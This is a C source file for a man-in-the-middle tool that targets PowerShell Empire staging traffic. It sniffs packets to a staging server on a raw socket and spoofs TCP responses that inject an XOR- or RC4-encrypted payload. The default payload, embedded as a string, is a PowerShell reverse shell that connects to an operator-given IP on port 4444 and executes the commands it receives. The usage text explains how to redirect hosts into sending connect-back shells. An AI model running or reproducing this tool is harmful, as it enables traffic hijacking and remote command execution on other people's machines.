/*
BSD 3-Clause License

Copyright (c) 2017, John Ventura
All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this
  list of conditions and the following disclaimer.

* Redistributions in binary form must reproduce the above copyright notice,
  this list of conditions and the following disclaimer in the documentation
  and/or other materials provided with the distribution.

* Neither the name of the copyright holder nor the names of its
  contributors may be used to endorse or promote products derived from
  this software without specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

#include <stdio.h>
#include <stdlib.h>
#define _GNU_SOURCE
#include <string.h>
#include <stdint.h>
#include <netdb.h>
#include <syslog.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <net/ethernet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/if.h>
#include <linux/filter.h>
#include <arpa/inet.h>
#include "network.h"
#include "global.h"


char *grabkey(char *url, int keylen);
uint8_t *xorstr(char *str, char *key);
uint8_t *packageRC4data(char *url, char *cookie, char *pfilename,
                        char *payload);
int filterIP(int sock, uint32_t ip);



char *outputheader =
    "HTTP/1.0 200 OK\x0d\x0a\x43ontent-Length: %i\x0d\x0a\x0d\x0a";
// "outputscript" has the default powershell payload. 
// I got this payload from:
//http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
//Nikhil "SamratAshok" Mittal
// Thank you, Mr. Mittal

char *outputscript =
    "function Start-Shell{$sm=(New-Object Net.Sockets.TCPClient('%s',4444)).GetStream();[byte[]]$bt=0..255|%%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}} Start-Shell # \n";

int sniffloop(uint32_t stagingip, int8_t * payload, int payloadlen)
{
    uint8_t *pkt;
    int pktlen;
    int sock;
    int payloadoffset;
    uint32_t seqtmp;
    struct in_addr addr;
    struct iphdr *ip;
    struct tcphdr *tcp;

    char *interface = "eth0";

    sock = getrawsock(interface);
    // Use LPF/BPF to ignore all data except staging server TCP packets
    filterIP(sock, stagingip);

    pkt = (uint8_t *) malloc(MAXPACKET);
    if (pkt == NULL) {
	perror("can't allocate memory");
	exit(1);
    }

    ip = (struct iphdr *) (pkt + (sizeof(struct ether_header)));
    tcp =
	(struct tcphdr *) (pkt + (sizeof(struct ether_header)) +
			   (sizeof(struct iphdr)));


    for (pktlen = 0; pktlen >= 0; pktlen = read(sock, pkt, MAXPACKET)) {
	if (pktlen > 0) {
	    payloadoffset =
		((sizeof(struct iphdr)) + (sizeof(struct ether_header)) +
		 (tcp->th_off * 4));

	    // if we see a PSH, spoof a response with our data
	    if (tcp->th_flags & TH_PUSH) {

		seqtmp = htonl(ntohl(tcp->seq) + (pktlen - payloadoffset));
		if (verbose) {
		    addr.s_addr = ip->saddr;
		    printf("sending payload to %s\n", inet_ntoa(addr));
		}
		sendtcpdata(ip->daddr, ip->saddr, tcp->dest, tcp->source, payload, payloadlen, tcp->ack_seq, seqtmp, ip->id, TH_PUSH | TH_ACK, 1);	// get rid of the 1

	    }

	}
    }

    return (0);
}

// isolate the server in "url" and resolve it via DNS
uint32_t resolveIPfromURL(char *url)
{
    char *hostptr;
    char *tptr;
    char *prefix = "http://";
    char *prefixs = "https://";
    uint32_t resolved;

    // we can't work from *url, because constants crash strcasecmp
    tptr = (char *) malloc(strlen(url));
    if (tptr == NULL) {
	perror("can't allocate memory");
	exit(1);
    }
    memset(tptr, 0x00, strlen(url));
    memcpy(tptr, url, strlen(url));

    hostptr = strcasestr(tptr, prefix);
    if (hostptr != NULL) {
	hostptr += strlen(prefix);
    } else {
	hostptr = (char *) strcasestr(tptr, prefixs);
	if (hostptr != NULL) {
	    hostptr += strlen(prefixs);
	}
    }

    // terminate hte hostname with a null
    strtok(hostptr, " :/");

    // finally use DNS 
    resolved = htonl(resolveipv4(hostptr));
    free(tptr);

    return (resolved);
}


void usage(char *progname)
{
    printf("%s is a MiTM helper utility for Powershell Empire\n", progname);
	printf("  -h\tDisplays this help message.\n");
	printf("  -u\tURL for staging service\n");
	printf("  -c\tIP for your console/listener\n");
	printf("  -t\tPlaintext file for RC4 attacks\n");
	printf("  \t(Contents must match the server's expected plaintext message)\n");
	printf("  -s\tSession identifier for RC4 attacks\n");
	printf("  \t(the value of the \"session\" cookie)\n");
	printf("  -o\tOutput file to use instead of packet spoofing\n");
	printf("  -i\tNetwork interface for spoofing/sniffing ('eth0' is default)\n");
	printf("  -v\tVerbose mode\n");
	printf("  -p\tText file that has the plaintext payload\n");
	printf("Examples:\n");
	printf("%s -u http://10.1.1.10:8080/login/process.php -c 172.16.0.5\n", progname);
	printf("\tTargets Powershell Empire version 1.6 and directs hosts to\n");
	printf("\tsend 'connect back' shells to 172.16.0.5\n");
	printf("%s -s WVUP/J2edjRlqEH9ctiRu75mpOM= -u http://10.1.1.10/login/process.php -t ./t -c 172.16.0.5\n", progname);
	printf("\tTargets Powershell Empire version 2.0.\n");
	printf("\tThe session cookie (-s) is required for RC4 attacks.\n");
	printf("%s -u http://10.1.1.10:8080/login/process.php -c 172.16.0.5 -o payload.bin -i eth1\n", progname);
	printf("\tTargets PowershellEmpire 1.6, but write the attack payload to 'payload.bin' instead of delivering it by packet spoofing. Redirecting powershell hosts to a web server that has 'payload.bin' should have the same effect as packet spoofing.\n");	
	printf("\tThis example also uses the 'eth1' interface\n");
	
}

int main(int argc, char *argv[])
{
    int keylen = 32;
    char *key;
    char c;
    char *stagingURL = NULL;
    char *shellsvr = NULL;
    char *payloadfile = NULL;
    char *payload;
    uint8_t *xorpayload;
    char *outhdrs;
    char *cookie;
    int payloadlen;
    uint8_t *outbuf;
    char *pfilename = NULL;
    char *outputfile = NULL;
    struct stat info;
    FILE *dest;
    FILE *source;

    // defaults for global variables
    verbose = 0;
    interface = "eth0";

    while ((c = getopt(argc, argv, "hi:u:c:t:s:o:vp:")) != -1) {
	switch (c) {
	case 'h':		// probably help
	    usage(argv[0]);
	    return (0);
	    break;
	case 'u':		// URL for staging server
	    stagingURL = optarg;
	    break;
	case 'c':		// IP for "console"
	    shellsvr = optarg;
	    break;
	case 't':		// plaintext file for RC4
	    pfilename = optarg;
	    break;
	case 's':		// session cookie 
	    cookie = optarg;
	    break;
	case 'o':		// output file
	    outputfile = optarg;
	    break;
	case 'i':		// output file
	    interface = optarg;
	    break;
	case 'v':		// verbose mode
	    verbose++;
	    break;
	case 'p':
    	    payloadfile = optarg;
	    break;
	default:
	    break;
	}
    }

    if (stagingURL == NULL) {
	fprintf(stderr, "I need a url for the staging server\n");
	exit(1);
    }

    if (shellsvr == NULL) {
	shellsvr = "";
    }
    // how much data are we injecting?
    if(payloadfile == NULL) {
    payloadlen = strlen(outputscript) + strlen(shellsvr);
    payload = (char *) malloc(payloadlen);
    if (payload == NULL) {
	perror("can't allocate memory");
	exit(1);
    }
    memset(payload, 0x00, payloadlen);

    // insert the IP defined in 'shellsvr' into the payload
    snprintf(payload, payloadlen, outputscript, shellsvr);
	} else {
		if(stat(payloadfile, &info) < 0) {
			perror("can't access file");
			exit(1);
		}
		payloadlen = info.st_size;
		payload = (char *)malloc(payloadlen);
		if(payload == NULL) {
			perror("can't allocate memory");
			exit(1);
		}
		source = fopen(payloadfile, "rb");
		if(source < 0) {
			fprintf(stderr, "can't open %s\n", payloadfile);
			exit(1);
		}	
		if(fread(payload, payloadlen, 1, source) == 0) {
			fprintf(stderr, "can't open %s\n", payloadfile);
			exit(1);
		}
		fclose(source);
		
	}

    // if they don't give us a "plaintext file", then
    // assume it's XOR instead of RC4
    if (pfilename == NULL) {
	if (verbose) {
	    printf("assuming we are using XOR\n");
	    printf("grabbing the XOR key\n");
	}
	key = (char *)grabkey(stagingURL, keylen);
	if (verbose) {
	    printf("key = %s\n", key);
	}

	xorpayload = xorstr(payload, key);
    } else {
	if (verbose) {
	    printf("assuming we are using RC4\n");
	}
	// if it's RC4, do this
	// we're going to need 4 extra bytes for the IV
	payloadlen = payloadlen + 4;	// add space for IV
	// repackage the payload for RC4
	xorpayload = 
	    packageRC4data(stagingURL, cookie, pfilename, payload);
    }

    // if the user specifies an output file
    // write the payload there and quit
    if (outputfile != NULL) {
	dest = fopen(outputfile, "w+");
	if (dest == NULL) {
	    fprintf(stderr, "can't open file %s\n", outputfile);
	    exit(1);
	}
	if (verbose) {
	    printf("writing payload to %s\n", outputfile);
	}
	fwrite(xorpayload, payloadlen, 1, dest);
	fclose(dest);
	return (0);
    }
    // we're going to need some HTTP headers
    // allocate the memory, and then populate them
    // Conten-Length: is easier than terminating the connection
    outhdrs = (char *) malloc(MAXPACKET);
    if (outhdrs == NULL) {
	perror("can't allocate memory");
	exit(1);
    }
    memset(outhdrs, 0x00, MAXPACKET);
    snprintf(outhdrs, MAXPACKET, outputheader, (payloadlen - 1));

    outbuf = (uint8_t *) malloc(payloadlen + strlen(outhdrs));
    if (outbuf == NULL) {
	perror("can't allocate memory");
	exit(1);
    }
    // put the headers together with the payload
    memcpy(outbuf, outhdrs, strlen(outhdrs));
    memcpy(outbuf + strlen(outhdrs), xorpayload, payloadlen);

    // start listening for PSH | ACKs to the real staging server
    sniffloop(resolveIPfromURL(stagingURL), outbuf,
	      (payloadlen + strlen(outputheader)));


    return (0);
} 
